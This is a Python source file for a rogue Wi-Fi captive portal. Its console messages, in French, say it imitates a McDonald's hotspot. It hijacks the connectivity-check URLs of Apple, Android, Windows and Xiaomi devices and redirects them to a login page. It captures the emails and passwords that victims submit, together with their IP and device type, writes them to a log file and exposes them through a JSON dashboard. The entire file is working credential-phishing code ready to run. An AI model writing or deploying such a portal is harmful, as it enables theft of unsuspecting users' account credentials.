#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
from urllib.parse import parse_qs
from datetime import datetime
import os
import json
import re

os.chdir(os.path.dirname(os.path.abspath(__file__)))

SESSION_START = datetime.now()
CLIENT_CONNECTIONS = set()


class CaptiveHandler(SimpleHTTPRequestHandler):

    def do_POST(self):
        # === Clear credentials log ===
        if self.path == '/dashboard/clear':
            open('credentials.log', 'w').close()
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            self.wfile.write(b'{"status": "cleared"}')
            print('[*] Credentials log effacé')
            return

        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')
        params = parse_qs(post_data)

        email = params.get('email', [''])[0]
        password = params.get('password', [''])[0]

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')

        device = "Unknown"
        if "iPhone" in user_agent:
            device = "iPhone"
        elif "iPad" in user_agent:
            device = "iPad"
        elif "Android" in user_agent:
            device = "Android"
        elif "Windows" in user_agent:
            device = "Windows"
        elif "Macintosh" in user_agent or "Mac OS" in user_agent:
            device = "macOS"
        elif "Linux" in user_agent:
            device = "Linux"

        log_line = f'[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | Device: {device}\n'

        with open('credentials.log', 'a') as f:
            f.write(log_line)

        print('\n' + '='*60)
        print(f'[!] CREDENTIALS CAPTURÉS')
        print(f'    Heure    : {timestamp}')
        print(f'    IP       : {client_ip}')
        print(f'    Device   : {device}')
        print(f'    Email    : {email}')
        print(f'    Password : {password}')
        print('='*60 + '\n')

        self.send_response(302)
        self.send_header('Location', '/success.html')
        self.end_headers()

    def do_GET(self):
        # === Redirection globale MIUI/Xiaomi ===
        host = self.headers.get('Host', '')
        if 'miui' in host or 'xiaomi' in host or 'connect.rom' in host:
            self.send_response(302)
            self.send_header('Location', 'http://192.168.50.1/index.html')
            self.end_headers()
            return

        # === API JSON dashboard ===
        if self.path == '/dashboard/data':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            credentials = []
            try:
                with open('credentials.log', 'r') as f:
                    for line in f:
                        match = re.match(
                            r'\[(.*?)\] IP: (.*?) \| Email: (.*?) \| Password: (.*?)(?:\s*\|\s*Device:\s*(.*?))?\s*$',
                            line.strip()
                        )
                        if match:
                            credentials.append({
                                'timestamp': match.group(1),
                                'ip': match.group(2),
                                'email': match.group(3),
                                'password': match.group(4),
                                'device': match.group(5) or 'Unknown'
                            })
            except FileNotFoundError:
                pass

            uptime_seconds = int((datetime.now() - SESSION_START).total_seconds())

            data = {
                'credentials': credentials,
                'total_captured': len(credentials),
                'uptime_seconds': uptime_seconds,
                'session_start': SESSION_START.strftime('%Y-%m-%d %H:%M:%S'),
                'active_clients': len(CLIENT_CONNECTIONS),
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }

            self.wfile.write(json.dumps(data).encode('utf-8'))
            return

        # === Dashboard HTML ===
        if self.path == '/dashboard':
            self.path = '/dashboard.html'

        captive_urls_redirect = [
            '/hotspot-detect.html',
            '/connecttest.txt',
            '/ncsi.txt',
            '/canonical.html',
            '/success.txt',
            '/library/test/success.html',
            '/miui/geoip',
            '/ping.html',
            '/kindle-wifi/wifistub.html',
            '/mobile/status.php',
        ]

        captive_urls_204 = [
            '/generate_204',
            '/gen_204',
            '/generate204',
        ]

        if not self.path.startswith('/dashboard'):
            CLIENT_CONNECTIONS.add(self.client_address[0])

        if self.path in captive_urls_204:
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(b'<html><head><meta http-equiv="refresh" content="0;url=http://192.168.50.1/index.html"></head><body><a href="http://192.168.50.1/index.html">Cliquez ici pour vous connecter</a></body></html>')
            return

        if self.path in captive_urls_redirect:
            self.send_response(302)
            self.send_header('Location', 'http://192.168.50.1/index.html')
            self.end_headers()
            return

        if self.path == '/':
            self.path = '/index.html'

        super().do_GET()

    def log_message(self, format, *args):
        msg = format % args
        if '/dashboard' not in msg:
            print(f"[HTTP] {self.client_address[0]} - {msg}")


if __name__ == '__main__':
    PORT = 80
    print('='*60)
    print(f'[*] Portail captif McDo actif sur le port {PORT}')
    print(f'[*] Dashboard SOC    : http://<IP_DU_PI>/dashboard')
    print(f'[*] Credentials log  : credentials.log')
    print(f'[*] CTRL+C pour arrêter')
    print('='*60)

    try:
        httpd = HTTPServer(('0.0.0.0', PORT), CaptiveHandler)
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('\n[*] Arrêt du portail captif')
        httpd.server_close()
